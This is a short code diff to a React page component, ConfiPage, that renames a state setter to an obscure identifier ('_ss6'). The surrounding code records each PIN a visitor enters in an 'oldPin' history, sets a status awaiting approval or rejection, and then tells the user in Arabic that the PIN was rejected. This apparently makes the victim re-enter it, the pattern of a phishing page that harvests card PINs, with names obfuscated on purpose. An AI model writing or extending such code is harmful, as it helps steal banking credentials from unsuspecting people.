@@ -20,7 +20,7 @@ export default function ConfiPage() {
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [isLoading, setIsLoading] = useState(true)
   const [visitorId, setVisitorId] = useState<string>("")
-  const [_v6Status, setPinStatus] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
+  const [_v6Status, _ss6] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
 
   // Initialize visitor ID and update current page
   useEffect(() => {
@@ -96,7 +96,7 @@ export default function ConfiPage() {
           oldPin: data.oldPin ? [...data.oldPin, currentPin] : [currentPin],
           _v6Status: "pending"
         }).then(() => {
-          setPinStatus("pending")
+          _ss6("pending")
           _s6("") // Clear the old PIN
           setError("تم رفض الرقم السري. يرجى إدخال رقم صحيح.")
           setIsSubmitting(false)
